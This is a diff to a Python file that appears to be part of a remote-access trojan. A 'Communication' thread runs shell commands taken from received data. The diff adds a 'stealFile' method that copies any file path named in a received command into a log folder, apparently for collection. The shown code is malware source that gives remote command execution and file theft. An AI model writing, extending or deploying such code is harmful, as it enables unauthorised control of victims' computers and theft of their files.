@@ -4,6 +4,7 @@ from threading import Thread
 from time import sleep
 from requests import get
 from json import loads, dumps
+from shutil import copy
 
 
 
@@ -45,6 +46,14 @@ class Communication(Thread):
             result = Util.executeShellCommand(data['shellcommand'])
             Util.fileOut(self.__config.logPath + 'shell.txt', result, 'w')
             print('shell command executed!')
+
+
+
+    def stealFile(self, data:dict):
+        if data.get('stealpath',''):
+            stealPath = data['stealpath']
+            filename = stealPath.split('\\')[-1]
+            copy(stealPath, self.__config.logPath + filename)
 
 
 
